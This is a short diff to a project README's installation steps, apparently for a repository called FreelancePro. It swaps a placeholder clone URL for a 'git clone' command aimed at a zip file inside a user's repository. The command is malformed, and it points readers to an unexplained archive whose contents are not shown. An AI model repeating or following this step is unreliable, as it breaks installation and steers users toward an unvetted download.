@@ -37,7 +37,7 @@ Installation
 
 Clone the repository:
 
-git clone https://github.com/yourusername/FreelancePro.git
+git clone https://github.com/Nishath1114/FreelancePro/blob/main/Freelance-Forge.zip
 
 
 Navigate to the project directory:
